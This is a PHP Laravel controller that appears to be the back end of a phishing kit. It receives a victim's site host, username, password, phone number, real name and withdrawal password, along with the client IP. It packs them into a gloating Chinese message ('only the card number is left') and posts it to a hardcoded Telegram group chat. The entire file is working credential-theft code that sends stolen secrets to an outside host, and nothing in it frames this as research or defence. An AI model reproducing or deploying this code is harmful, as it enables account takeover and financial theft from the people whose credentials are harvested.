<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Telegram;
use App\Http\Controllers\qiniuController as sms;

class jCTGBotController extends Controller
{

    public function sendMsg(Request $request)
    {
        $host = $request->input('host');
        $tel = $request->input('tel');
        $username = $request->input('username');
        $passwd = $request->input('passwd');
        $realname = $request->input('realname');
        $wdpass = $request->input('wdpass');
        $ip = $request->getClientIp();
        // $verify_code = $request->input('verify_code');
        // $uuid = $request->input('uuid');

        // if (!sms::checkVerify($uuid, $tel, $verify_code)) {
        //     return response()->json($this->response(500, '验证码错误'));
        // }
        $msg = <<<EOF
------datetime------
雷迪斯爱得站套门，跟我一起干坏事！！！
网址：`host`
会员名这个：`username`
密码交给你：`passwd`
号码请留好：`tel`
火钳刘明：`realname`
取款密码：`wdpass`,就剩卡号了🤣
IP：`ip`,请自行查询
哎呀呀，唉鸭鸭~
---------------------------
EOF;
        $msg = str_replace('datetime', date("Y-m-d H:i", time()), $msg);
        $msg = str_replace('host', $host, $msg);
        $msg = str_replace('username', $username, $msg);
        $msg = str_replace('tel', $tel, $msg);
        $msg = str_replace('passwd', $passwd, $msg);
        $msg = str_replace('realname', $realname, $msg);
        $msg = str_replace('wdpass', $wdpass, $msg);
        $msg = str_replace('ip', $ip, $msg);
        try {
            $response = Telegram::sendMessage([
                'chat_id' => '-1001237099745',
                'text' => $msg,
                'parse_mode' => 'markdown',
            ]);
            $messageId = $response->getMessageId();
            if ($messageId) {
                return response()->json($this->response(200, 'success', ['msg_id' => $messageId]));
            }
            return response()->json($this->response(400, '提交失败'));
        } catch (\Exception $e) {
            return response()->json($this->response($e->getCode(), $e->getMessage()));
        }
    }

    /**
     *
     * @param int $codeInt
     * @param string $msgStr
     * @param array $restultArr
     * @return array
     */
    private function response($code, $msg, $result = [])
    {
        return $result = array(
            'ret_code' => $code,
            'ret_msg' => $msg,
            'result' => $result,
        );
    }
}
